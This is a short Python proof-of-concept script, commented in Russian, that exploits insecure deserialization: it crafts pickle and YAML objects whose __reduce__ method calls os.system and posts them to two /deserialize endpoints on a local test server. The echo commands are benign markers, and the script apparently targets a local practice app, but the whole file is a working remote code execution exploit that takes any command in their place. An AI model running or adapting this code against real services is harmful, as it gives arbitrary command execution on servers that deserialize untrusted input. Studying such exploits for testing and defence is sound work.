import requests
import pickle
import base64
import yaml

# Определение вредоносного класса
class Exploit(object):
    def __reduce__(self):
        return (__import__("os").system, ("echo Hacked > hacked.txt",))

class Exploit1(object):
    def __reduce__(self):
        return (__import__("os").system, ("echo F_YAML > hacked1.txt",))

# Сериализация объекта
exploit_object = Exploit()
serialized_exploit = pickle.dumps(exploit_object)
encoded_exploit = base64.b64encode(serialized_exploit).decode('utf-8')

# Отправка запроса
url = 'http://127.0.0.1:5000/deserialize/1/'
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
payload = {'data': encoded_exploit}
response = requests.post(url, headers=headers, data=payload)

exploit_object1 = Exploit1()
exploit_yaml = yaml.dump(exploit_object1)
url1 = 'http://127.0.0.1:5000/deserialize/2/'
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
payload = {'data': exploit_yaml}
response1 = requests.post(url1, headers=headers, data=payload)

# Вывод ответа
print(response1.text)
